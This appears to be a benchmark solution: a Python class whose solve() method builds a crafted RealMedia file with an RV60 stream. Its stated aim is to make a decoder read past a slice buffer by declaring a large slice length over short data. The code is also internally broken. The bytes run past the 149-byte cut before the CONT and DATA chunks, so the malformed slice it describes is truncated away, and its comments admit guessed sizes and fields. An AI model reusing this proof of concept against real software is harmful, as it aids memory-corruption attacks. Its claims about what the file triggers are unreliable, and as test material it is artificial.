import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal crafted RM file header for RV60
        poc = b'.RMF\x00'
        poc += struct.pack('<I', 0)  # object_id
        poc += struct.pack('<I', 200)  # size (approximate)
        poc += struct.pack('<H', 0)  # version
        poc += struct.pack('<I', 0)  # file_version
        poc += struct.pack('<I', 100)  # headers_size
        poc += struct.pack('<I', 1)  # num_headers
        # PROP chunk
        poc += b'PROP\x00'
        poc += struct.pack('<I', 3)  # object_id
        poc += struct.pack('<I', 50)  # size
        poc += b'\x00' * 46
        # MDPR chunk for RV60 video
        poc += b'MDPR\x00'
        poc += struct.pack('<I', 14)  # object_id
        poc += struct.pack('<I', 80)  # size
        poc += struct.pack('<I', 0)  # stream_num
        poc += b'video/X-RV60'  # mime type
        poc += b'\x00' * (80 - 4 - 12)
        # CONT chunk
        poc += b'CONT\x00'
        poc += struct.pack('<I', 4)  # object_id
        poc += struct.pack('<I', 16)  # size
        poc += b'\x00' * 12
        # DATA chunk with malformed RV60 data to trigger slice gb issue
        poc += b'DATA\x00'
        poc += struct.pack('<I', 12)  # object_id
        poc += struct.pack('<I', 40)  # size
        # Malformed data: RV60 frame with bad slice size
        # Start with RV subheader or something
        data = b'\x00\x00'  # picture type or keyframe
        data += struct.pack('<I', 320)  # width
        data += struct.pack('<I', 240)  # height
        data += b'\x01'  # num slices
        # Slice header with large size to cause overflow
        data += struct.pack('<I', 1000)  # fake large slice len
        data += b'\x00' * 20  # short data to cause read beyond
        poc += data
        # Pad to around 149
        poc += b'\x00' * (149 - len(poc))
        return poc[:149]
